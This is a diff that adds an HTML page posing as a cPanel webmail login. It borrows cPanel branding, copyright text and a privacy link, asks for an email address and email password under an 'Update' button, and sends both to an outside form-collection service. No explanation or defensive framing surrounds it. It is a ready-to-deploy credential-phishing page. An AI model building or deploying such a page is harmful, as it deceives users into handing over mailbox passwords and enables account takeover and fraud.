@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en" id="html">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="updat-message">
+        <p></p>
+    </div>
+    <div class="container">
+        <div class="alert" id="alert">Password must be 8 characters long</div>
+        <img class="logo" src="img/webmail-logo.svg" alt="Webmail Logo">
+        <form id="loginForm" action="https://submit-form.com/bXCkkZXP1"
+        method="POST" onsubmit="return validateForm()">
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <div class="input-group">
+                    <img class="icons" src="img/user_149071.png" alt="">
+                    <input type="email" id="email" placeholder="Enter your email address"name="email" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <div class="input-group">
+                    <img class="icons" src="img/6956463_preview.png" alt="">
+                    <input type="password" id="password" placeholder="Enter your email password" name="password" required>
+                </div>
+            </div>
+            <button type="submit">Update</button>
+        </form>
+    </div>
+    <div class="footer">
+        <span data-lang="ar">عربية</span>
+        <span data-lang="cs">čeština</span>
+        <span data-lang="da">dansk</span>
+        <span data-lang="de">Deutsch</span>
+        <span data-lang="el">Ελληνικά</span>
+        <span data-lang="es">español</span>
+        <span data-lang="es_LA">español latinoamericano</span>
+        <span data-lang="es_ES">español de España</span>
+        <!-- Add more languages as needed -->
+    </div>
+    <div class="copyright">
+        <img class="foot-img" src="img/pngfind.com-cpanel-png-3444481.png" alt="">
+        <p>Copyright© 2024 cPanel, L.L.C.</p>
+        <a href="https://cpanel.net/privacy-policy/">Privacy Policy</a>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
